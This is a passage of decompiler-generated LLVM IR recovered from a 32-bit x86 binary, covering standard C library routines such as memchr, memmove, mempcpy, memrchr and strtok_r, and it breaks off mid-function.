  store i32 %v0_805648c, i32* %v3_805648c, align 4
  %v0_805648f = load i32, i32* @ecx, align 4
  %v1_805648f = add i32 %v0_805648f, 12
  store i32 %v1_805648f, i32* @ecx, align 4
  br label %dec_label_pc_8056492

dec_label_pc_8056492:                             ; preds = %dec_label_pc_8056417, %dec_label_pc_80560c1, %dec_label_pc_8056472
  %v0_8056511 = phi i32 [ %v1_805649f121, %dec_label_pc_8056417 ], [ %v2_80560c9, %dec_label_pc_80560c1 ], [ %v1_805648f, %dec_label_pc_8056472 ]
  %v2_8056492 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8056492, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056496

dec_label_pc_8056496:                             ; preds = %dec_label_pc_8056496, %dec_label_pc_8056492
  %v0_8056496 = phi i32 [ %v2_8056492, %dec_label_pc_8056492 ], [ %v1_8056498, %dec_label_pc_8056496 ]
  %stack_var_-216.0 = phi i32 [ %v3_8055fc3, %dec_label_pc_8056492 ], [ %v5_805649b, %dec_label_pc_8056496 ]
  %v1_8056496 = inttoptr i32 %v0_8056496 to i32*
  %v2_8056496 = load i32, i32* %v1_8056496, align 4
  store i32 %v2_8056496, i32* %ebx.global-to-local, align 4
  %v1_8056498 = add i32 %v0_8056496, 12
  store i32 %v1_8056498, i32* %eax.global-to-local, align 4
  %v5_805649b = sub i32 %stack_var_-216.0, %v2_8056496
  %v7_805649f = icmp ult i32 %v1_8056498, %v0_8056511
  br i1 %v7_805649f, label %dec_label_pc_8056496, label %dec_label_pc_80564a3

dec_label_pc_80564a3:                             ; preds = %dec_label_pc_8056496
  store i32 %v0_8056511, i32* %esi.global-to-local, align 4
  %v5_80564b6 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_80564c6 = icmp eq i1 %v5_80564b6, false
  %v2_80564c6 = zext i1 %v1_80564c6 to i32
  store i32 %v2_80564c6, i32* %edx.global-to-local, align 4
  %v2_80564c9 = sub i32 %v5_805649b, %v2_80564c6
  store i32 %v2_80564c9, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_80564c9, 1
  br i1 %tmp190, label %dec_label_pc_8056513, label %dec_label_pc_80564d3

dec_label_pc_80564d3:                             ; preds = %dec_label_pc_80564a3
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80564da = inttoptr i32 %v1_8056003 to i8*
  %v3_80564da = load i8, i8* %v2_80564da, align 1
  %v4_80564da = and i8 %v3_80564da, 8
  %v5_80564da = icmp eq i8 %v4_80564da, 0
  br i1 %v5_80564da, label %dec_label_pc_80564f5, label %dec_label_pc_80564e0

dec_label_pc_80564e0:                             ; preds = %dec_label_pc_80564d3
  %v1_80564e0 = add i32 %v0_8056511, 12
  store i32 %v1_80564e0, i32* %esi.global-to-local, align 4
  %v1_80564e3 = inttoptr i32 %v0_8056511 to i32*
  store i32 160, i32* %v1_80564e3, align 4
  %v1_80564e9 = load i32, i32* @ecx, align 4
  %v2_80564e9 = add i32 %v1_80564e9, 4
  %v3_80564e9 = inttoptr i32 %v2_80564e9 to i32*
  store i32 %v2_80564c9, i32* %v3_80564e9, align 4
  %v0_80564ec = load i32, i32* @ecx, align 4
  %v1_80564ec = add i32 %v0_80564ec, 8
  %v2_80564ec = inttoptr i32 %v1_80564ec to i32*
  store i32 ptrtoint (i32* @global_var_805d373.577 to i32), i32* %v2_80564ec, align 4
  br label %dec_label_pc_8056513

dec_label_pc_80564f5:                             ; preds = %dec_label_pc_80564d3
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_80564fc = add i32 %tmp156, 16
  %v2_80564fc = inttoptr i32 %v1_80564fc to i32*
  %v3_80564fc = load i32, i32* %v2_80564fc, align 4
  %v9_80564fc = icmp eq i32 %v3_80564fc, 48
  %v1_8056500 = icmp eq i1 %v9_80564fc, false
  br i1 %v1_8056500, label %dec_label_pc_805650d, label %dec_label_pc_8056502

dec_label_pc_8056502:                             ; preds = %dec_label_pc_80564f5
  %v3_8056502 = load i32, i32* %stack_var_-152, align 4
  %v5_8056502 = add i32 %v3_8056502, %v2_80564c9
  store i32 %v5_8056502, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8056511

dec_label_pc_8056508:                             ; preds = %dec_label_pc_8056519
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056540

dec_label_pc_805650d:                             ; preds = %dec_label_pc_80564f5
  br label %dec_label_pc_8056511

dec_label_pc_8056511:                             ; preds = %dec_label_pc_8056502, %dec_label_pc_805650d
  store i32 %v0_8056511, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056513

dec_label_pc_8056513:                             ; preds = %dec_label_pc_80564a3, %dec_label_pc_80564e0, %dec_label_pc_8056511
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8056515 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8056515, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056519

dec_label_pc_8056519:                             ; preds = %dec_label_pc_8056537, %dec_label_pc_8056513
  call void @__pseudo_call(i32 %tmp156)
  %v1_8056532 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056532 = add i32 %v1_8056532, 4
  %v3_8056532 = inttoptr i32 %v2_8056532 to i32*
  %v4_8056532 = load i32, i32* %v3_8056532, align 4
  %v15_8056532 = icmp eq i32 %v2_80564c9, %v4_8056532
  %v1_8056535 = icmp eq i1 %v15_8056532, false
  br i1 %v1_8056535, label %dec_label_pc_8056508, label %dec_label_pc_8056537

dec_label_pc_8056537:                             ; preds = %dec_label_pc_8056519
  %v1_8056537 = add i32 %v1_8056532, 12
  store i32 %v1_8056537, i32* %ebx.global-to-local, align 4
  %v0_805653a = load i32, i32* %edi.global-to-local, align 4
  %v2_805653a = add i32 %v0_805653a, %v2_80564c9
  store i32 %v2_805653a, i32* %edi.global-to-local, align 4
  %v1_805653c = load i32, i32* %esi.global-to-local, align 4
  %v7_805653c = icmp ult i32 %v1_8056537, %v1_805653c
  br i1 %v7_805653c, label %dec_label_pc_8056519, label %dec_label_pc_8056540

dec_label_pc_8056540:                             ; preds = %dec_label_pc_8056537, %dec_label_pc_8056508
  %v0_8056546 = phi i32 [ -1, %dec_label_pc_8056508 ], [ %v2_805653a, %dec_label_pc_8056537 ]
  store i32 %v0_8056546, i32* %eax.global-to-local, align 4
  %v2_8056549 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056549, i32* @esi, align 4
  store i32 %v0_8055fa6, i32* @edi, align 4
  store i32 %v0_8055fa5, i32* @ebp, align 4
  ret i32 %v0_8056546

; uselistorder directives
  uselistorder i32 %v0_8056546, { 1, 0 }
  uselistorder i32 %v2_80564c9, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_80564c6, { 1, 0 }
  uselistorder i32 %v1_8056498, { 1, 2, 0 }
  uselistorder i32 %v0_8056496, { 1, 0 }
  uselistorder i32 %v0_8056511, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_805645c, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_8056425, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80563fe, { 1, 0 }
  uselistorder i32 %v1_80563fe, { 1, 0, 2 }
  uselistorder i32 %v2_80563fc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_80563b9, { 1, 0 }
  uselistorder i32 %v2_8056326, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8056320, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805637d, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_80562bc, { 1, 0 }
  uselistorder i32 %v0_80562b7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8056284, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805627f, { 1, 0 }
  uselistorder i8 %v2_8056278, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8056278, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8056202, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_80561e7, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80561b2, { 1, 0 }
  uselistorder i32 %v2_805616b, { 2, 1, 0 }
  uselistorder i32 %v0_8056221, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_805613d, { 1, 0 }
  uselistorder x86_fp80 %v3_805611f, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_805611c, { 1, 0 }
  uselistorder x86_fp80 %v4_8056104, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_80560fe, { 1, 2, 0 }
  uselistorder i32 %v3_80560fb, { 1, 0 }
  uselistorder i32 %v1_80560f4, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_805612d, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_80560f5, { 1, 0 }
  uselistorder i8 %v4_80560a5, { 1, 0 }
  uselistorder i3 %v1_8056042, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8055fca, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8055fc3, { 1, 0, 2 }
  uselistorder i3 %v4_8055fbc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 9, 10, 11, 5, 4, 2, 0, 1, 8, 12, 7, 6, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 4, 2, 3, 0, 5, 6, 8, 1, 7 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 8, 9, 11, 12, 2, 3, 1, 0, 4, 5, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 21, 22, 23, 24, 25, 26, 0, 27, 28, 3, 5, 4, 6, 1, 2, 7, 10, 8, 11, 9, 12, 13, 14, 15, 16, 20, 17, 18, 19 }
  uselistorder i32* %edi.global-to-local, { 3, 5, 6, 4, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 14, 0, 1, 15, 2, 3, 4, 5, 9, 10, 6, 7, 8, 11, 12, 13, 16, 17 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 4, 5, 0, 2, 6, 1, 3, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 22, 23, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 13, { 1, 6, 5, 2, 3, 4, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056513, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056511, { 1, 0 }
  uselistorder label %dec_label_pc_8056492, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805643f, { 1, 0 }
  uselistorder label %dec_label_pc_8056417, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80563e6, { 1, 0 }
  uselistorder label %dec_label_pc_80563d3, { 1, 0 }
  uselistorder label %dec_label_pc_80563b9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056386, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056371, { 1, 0 }
  uselistorder label %dec_label_pc_8056366, { 1, 0 }
  uselistorder label %dec_label_pc_80562ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80562df, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80562a5, { 1, 0 }
  uselistorder label %dec_label_pc_8056275.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8056241, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056210, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80561fb, { 1, 0 }
  uselistorder label %dec_label_pc_8056167, { 1, 0 }
  uselistorder label %dec_label_pc_805613f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805613d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805612d, { 1, 0 }
  uselistorder label %dec_label_pc_80560c1, { 1, 0 }
  uselistorder label %dec_label_pc_8055fea, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8056550 = load i32, i32* @edi, align 4
  store i32 %v0_8056550, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8056557 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056557, i32* %edi.global-to-local, align 4
  %v1_805655f = icmp eq i32 %arg3, 0
  store i1 %v1_805655f, i1* %zf.global-to-local, align 1
  br i1 %v1_805655f, label %dec_label_pc_805656f, label %dec_label_pc_8056563

dec_label_pc_8056563:                             ; preds = %entry
  %v2_8056563 = call i32 @_strlen(i8* %arg1)
  %v3_8056563 = mul i32 %v2_8056563, -1
  %v4_8056563 = add i32 %v3_8056563, -2
  store i32 %v4_8056563, i32* @ecx, align 4
  %v0_8056565 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8056565, label %dec_label_pc_8056563.dec_label_pc_805656c_crit_edge, label %dec_label_pc_8056567

dec_label_pc_8056563.dec_label_pc_805656c_crit_edge: ; preds = %dec_label_pc_8056563
  %v0_805656c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_805656c.pre, -1
  br label %dec_label_pc_805656c

dec_label_pc_8056567:                             ; preds = %dec_label_pc_8056563
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805656c

dec_label_pc_805656c:                             ; preds = %dec_label_pc_8056563.dec_label_pc_805656c_crit_edge, %dec_label_pc_8056567
  %v0_805656c = phi i32 [ %phitmp, %dec_label_pc_8056563.dec_label_pc_805656c_crit_edge ], [ 0, %dec_label_pc_8056567 ]
  %v8_805656c = icmp eq i32 %v0_805656c, 0
  store i1 %v8_805656c, i1* %zf.global-to-local, align 1
  store i32 %v0_805656c, i32* %edi.global-to-local, align 4
  %v2_805656f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805656f

dec_label_pc_805656f:                             ; preds = %entry, %dec_label_pc_805656c
  %v0_8056570 = phi i32 [ 0, %entry ], [ %v0_805656c, %dec_label_pc_805656c ]
  %v2_805656f = phi i32 [ %v0_8056550, %entry ], [ %v2_805656f.pre, %dec_label_pc_805656c ]
  store i32 %v2_805656f, i32* @edi, align 4
  ret i32 %v0_8056570

; uselistorder directives
  uselistorder i32 %v0_805656c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805656f, { 1, 0 }
  uselistorder label %dec_label_pc_805656c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8056575 = load i32, i32* @esi, align 4
  store i32 %v0_8056575, i32* %stack_var_-8, align 4
  %v4_8056576 = ptrtoint i8* %arg1 to i32
  %v9_8056582 = icmp ugt i8* %tmp3, %arg1
  %v1_8056584 = icmp eq i1 %v9_8056582, false
  br i1 %v1_8056584, label %dec_label_pc_805658c, label %dec_label_pc_8056586

dec_label_pc_8056586:                             ; preds = %entry
  %v7_8056588 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8056598

dec_label_pc_805658c:                             ; preds = %entry
  %v3_805658c = add i32 %arg2, -1
  %v4_805658c = add i32 %v3_805658c, %tmp
  %v5_805658c = inttoptr i32 %v4_805658c to i8*
  %v3_8056590 = add i32 %v4_8056576, -1
  %v4_8056590 = add i32 %v3_8056590, %tmp
  %v5_8056590 = inttoptr i32 %v4_8056590 to i8*
  %v7_8056595 = call i8* @_memcpy(i8* %v5_8056590, i8* %v5_805658c, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8056598

dec_label_pc_8056598:                             ; preds = %dec_label_pc_8056586, %dec_label_pc_805658c
  %v2_8056598 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056598, i32* @esi, align 4
  ret i32 %v4_8056576

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056598, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805659c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_80565af = inttoptr i32 %arg1 to i16*
  %v4_80565af = call i32 @memcpy(i16* %v3_80565af, i32 %arg2, i32 %arg3)
  %v0_80565b7 = load i32, i32* @esi, align 4
  %v2_80565b7 = add i32 %v0_80565b7, %arg3
  store i32 %v0_805659c, i32* @esi, align 4
  ret i32 %v2_80565b7
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_80565c5 = urem i32 %arg2, 256
  %v4_80565d1 = sext i8 %arg1 to i32
  %v2_80565d5 = add i32 %v4_80565d1, %arg3
  %v1_80565e77 = icmp eq i32 %arg3, 0
  br i1 %v1_80565e77, label %dec_label_pc_80565ef, label %dec_label_pc_80565eb

dec_label_pc_80565d9:                             ; preds = %dec_label_pc_80565eb
  %v1_80565d9 = add i32 %v0_80565d9, -1
  %v5_80565da = load i32, i32* @edx, align 4
  %v6_80565da = and i32 %v5_80565da, -256
  %v7_80565da = or i32 %v6_80565da, %v4_80565c5
  store i32 %v7_80565da, i32* @edx, align 4
  %v1_80565de = inttoptr i32 %v1_80565d9 to i8*
  %v2_80565de = load i8, i8* %v1_80565de, align 1
  %v15_80565de = icmp eq i8 %v2_80565de, %tmp
  br i1 %v15_80565de, label %dec_label_pc_805666c, label %dec_label_pc_80565e6

dec_label_pc_80565e6:                             ; preds = %dec_label_pc_80565d9
  %v1_80565e6 = add i32 %v0_80565e6, -1
  %v8_80565e6 = icmp eq i32 %v1_80565e6, 0
  br i1 %v8_80565e6, label %dec_label_pc_80565ef, label %dec_label_pc_80565eb

dec_label_pc_80565eb:                             ; preds = %entry, %dec_label_pc_80565e6
  %v0_80565e6 = phi i32 [ %v1_80565e6, %dec_label_pc_80565e6 ], [ %arg3, %entry ]
  %v0_80565d9 = phi i32 [ %v1_80565d9, %dec_label_pc_80565e6 ], [ %v2_80565d5, %entry ]
  %v2_80565eb = urem i32 %v0_80565d9, 4
  %v3_80565eb = icmp eq i32 %v2_80565eb, 0
  %v1_80565ed = icmp eq i1 %v3_80565eb, false
  br i1 %v1_80565ed, label %dec_label_pc_80565d9, label %dec_label_pc_80565ef

dec_label_pc_80565ef:                             ; preds = %dec_label_pc_80565e6, %dec_label_pc_80565eb, %entry
  %v0_8056652.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80565e6 ], [ %v0_80565e6, %dec_label_pc_80565eb ]
  %v0_80565f4 = phi i32 [ %v2_80565d5, %entry ], [ %v1_80565d9, %dec_label_pc_80565e6 ], [ %v0_80565d9, %dec_label_pc_80565eb ]
  store i32 %v0_80565f4, i32* @ecx, align 4
  %v2_80565f8 = mul nuw nsw i32 %v4_80565c5, 256
  %v2_80565fb = or i32 %v2_80565f8, %v4_80565c5
  %v2_80565ff = mul i32 %v2_80565fb, 65536
  %v2_8056602 = or i32 %v2_80565ff, %v2_80565fb
  %v6_805665555 = icmp ugt i32 %v0_8056652.pr, 3
  br i1 %v6_805665555, label %dec_label_pc_8056606, label %dec_label_pc_8056657

dec_label_pc_8056606:                             ; preds = %dec_label_pc_80565ef, %dec_label_pc_805664f
  %v0_805664f57 = phi i32 [ %v1_805664f, %dec_label_pc_805664f ], [ %v0_8056652.pr, %dec_label_pc_80565ef ]
  %v0_805660656 = phi i32 [ %v1_8056606, %dec_label_pc_805664f ], [ %v0_80565f4, %dec_label_pc_80565ef ]
  %v1_8056606 = add i32 %v0_805660656, -4
  store i32 %v1_8056606, i32* @ecx, align 4
  %v2_805660b = inttoptr i32 %v1_8056606 to i32*
  %v3_805660b = load i32, i32* %v2_805660b, align 4
  %v4_805660b = xor i32 %v3_805660b, %v2_8056602
  %v1_805660d = add i32 %v4_805660b, 2130640639
  %v1_8056613 = sub i32 -1, %v4_805660b
  %v2_8056615 = xor i32 %v1_805660d, %v1_8056613
  %v1_8056617 = and i32 %v2_8056615, -2130640640
  %v2_8056617 = icmp eq i32 %v1_8056617, 0
  br i1 %v2_8056617, label %dec_label_pc_805664f, label %dec_label_pc_805661f

dec_label_pc_805661f:                             ; preds = %dec_label_pc_8056606
  %v7_805661f = or i32 %v1_8056617, %v4_80565c5
  %v1_8056623 = add i32 %v0_805660656, -1
  %v2_8056626 = inttoptr i32 %v1_8056623 to i8*
  %v3_8056626 = load i8, i8* %v2_8056626, align 1
  %v16_8056626 = icmp eq i8 %v3_8056626, %tmp
  br i1 %v16_8056626, label %dec_label_pc_805666c, label %dec_label_pc_805662b

dec_label_pc_805662b:                             ; preds = %dec_label_pc_805661f
  %v1_805662f = add i32 %v0_805660656, -2
  %v2_8056632 = inttoptr i32 %v1_805662f to i8*
  %v3_8056632 = load i8, i8* %v2_8056632, align 1
  %v16_8056632 = icmp eq i8 %v3_8056632, %tmp
  br i1 %v16_8056632, label %dec_label_pc_805666c, label %dec_label_pc_8056637

dec_label_pc_8056637:                             ; preds = %dec_label_pc_805662b
  %v1_805663b = add i32 %v0_805660656, -3
  %v2_805663e = inttoptr i32 %v1_805663b to i8*
  %v3_805663e = load i8, i8* %v2_805663e, align 1
  %v16_805663e = icmp eq i8 %v3_805663e, %tmp
  br i1 %v16_805663e, label %dec_label_pc_805666c, label %dec_label_pc_8056643

dec_label_pc_8056643:                             ; preds = %dec_label_pc_8056637
  %v1_8056647 = inttoptr i32 %v1_8056606 to i8*
  %v2_8056647 = load i8, i8* %v1_8056647, align 1
  %v15_8056647 = icmp eq i8 %v2_8056647, %tmp
  %v1_8056649 = icmp eq i1 %v15_8056647, false
  br i1 %v1_8056649, label %dec_label_pc_805664f, label %dec_label_pc_805664b

dec_label_pc_805664b:                             ; preds = %dec_label_pc_8056643
  br label %dec_label_pc_805666c

dec_label_pc_805664f:                             ; preds = %dec_label_pc_8056643, %dec_label_pc_8056606
  %v5_805665c27 = phi i32 [ %v7_805661f, %dec_label_pc_8056643 ], [ 0, %dec_label_pc_8056606 ]
  %v1_805664f = add i32 %v0_805664f57, -4
  %v6_8056655 = icmp ugt i32 %v1_805664f, 3
  br i1 %v6_8056655, label %dec_label_pc_8056606, label %dec_label_pc_8056657

dec_label_pc_8056657:                             ; preds = %dec_label_pc_805664f, %dec_label_pc_80565ef
  %v5_805665c26.lcssa = phi i32 [ %v4_80565c5, %dec_label_pc_80565ef ], [ %v5_805665c27, %dec_label_pc_805664f ]
  %v0_8056606.lcssa = phi i32 [ %v0_80565f4, %dec_label_pc_80565ef ], [ %v1_8056606, %dec_label_pc_805664f ]
  %v0_805664f.lcssa = phi i32 [ %v0_8056652.pr, %dec_label_pc_80565ef ], [ %v1_805664f, %dec_label_pc_805664f ]
  br label %dec_label_pc_8056664

dec_label_pc_805665b:                             ; preds = %dec_label_pc_8056664
  %v1_8056664 = add i32 %v0_8056664, -1
  %v1_805665b = add i32 %v0_805665b, -1
  %v6_805665c = and i32 %v5_805665c, -256
  %v7_805665c = or i32 %v6_805665c, %v4_80565c5
  %v1_8056660 = inttoptr i32 %v1_805665b to i8*
  %v2_8056660 = load i8, i8* %v1_8056660, align 1
  %v15_8056660 = icmp eq i8 %v2_8056660, %tmp
  br i1 %v15_8056660, label %dec_label_pc_805666c, label %dec_label_pc_8056664

dec_label_pc_8056664:                             ; preds = %dec_label_pc_805665b, %dec_label_pc_8056657
  %v5_805665c = phi i32 [ %v7_805665c, %dec_label_pc_805665b ], [ %v5_805665c26.lcssa, %dec_label_pc_8056657 ]
  %v0_805665b = phi i32 [ %v1_805665b, %dec_label_pc_805665b ], [ %v0_8056606.lcssa, %dec_label_pc_8056657 ]
  %v0_8056664 = phi i32 [ %v1_8056664, %dec_label_pc_805665b ], [ %v0_805664f.lcssa, %dec_label_pc_8056657 ]
  %v10_8056665 = icmp eq i32 %v0_8056664, 0
  %v1_8056668 = icmp eq i1 %v10_8056665, false
  br i1 %v1_8056668, label %dec_label_pc_805665b, label %dec_label_pc_805666a

dec_label_pc_805666a:                             ; preds = %dec_label_pc_8056664
  br label %dec_label_pc_805666c

dec_label_pc_805666c:                             ; preds = %dec_label_pc_80565d9, %dec_label_pc_8056637, %dec_label_pc_805662b, %dec_label_pc_805661f, %dec_label_pc_805665b, %dec_label_pc_805664b, %dec_label_pc_805666a
  %v0_805666f = phi i32 [ %v1_8056606, %dec_label_pc_805664b ], [ 0, %dec_label_pc_805666a ], [ %v1_805665b, %dec_label_pc_805665b ], [ %v1_805663b, %dec_label_pc_8056637 ], [ %v1_805662f, %dec_label_pc_805662b ], [ %v1_8056623, %dec_label_pc_805661f ], [ %v1_80565d9, %dec_label_pc_80565d9 ]
  ret i32 %v0_805666f

; uselistorder directives
  uselistorder i32 %v0_8056664, { 1, 0 }
  uselistorder i32 %v1_805664f, { 0, 2, 1 }
  uselistorder i32 %v1_8056606, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805660656, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80565fb, { 1, 0 }
  uselistorder i32 %v0_80565d9, { 1, 0, 2 }
  uselistorder i32 %v2_80565d5, { 1, 0 }
  uselistorder i32 %v4_80565c5, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805666c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056606, { 1, 0 }
  uselistorder label %dec_label_pc_80565ef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80565eb, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056670 = load i32, i32* @edi, align 4
  %v0_8056671 = load i32, i32* @esi, align 4
  %v0_8056672 = load i32, i32* @ebx, align 4
  store i32 %v0_8056672, i32* %stack_var_-12, align 4
  %v4_8056673 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056673, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805667f = icmp eq i8* %arg1, null
  %v1_8056681 = icmp eq i1 %v1_805667f, false
  br i1 %v1_8056681, label %dec_label_pc_8056685, label %dec_label_pc_8056683

dec_label_pc_8056683:                             ; preds = %entry
  %v1_8056683 = inttoptr i32 %arg3 to i32*
  %v2_8056683 = load i32, i32* %v1_8056683, align 4
  store i32 %v2_8056683, i32* @ebx, align 4
  br label %dec_label_pc_8056685

dec_label_pc_8056685:                             ; preds = %entry, %dec_label_pc_8056683
  %v0_8056688 = phi i32 [ %v4_8056673, %entry ], [ %v2_8056683, %dec_label_pc_8056683 ]
  %v0_8056685 = load i32, i32* @ecx, align 4
  %v5_8056688 = inttoptr i32 %v0_8056688 to i8*
  %v8_8056689 = call i32 @__GI_strspn(i8* %v5_8056688, i32 %arg2, i32 %v0_8056685, i32 %v0_8056685)
  store i32 %v8_8056689, i32* %eax.global-to-local, align 4
  %v0_8056691 = load i32, i32* @ebx, align 4
  %v2_8056691 = add i32 %v0_8056691, %v8_8056689
  store i32 %v2_8056691, i32* @ebx, align 4
  %v1_8056693 = inttoptr i32 %v2_8056691 to i8*
  %v2_8056693 = load i8, i8* %v1_8056693, align 1
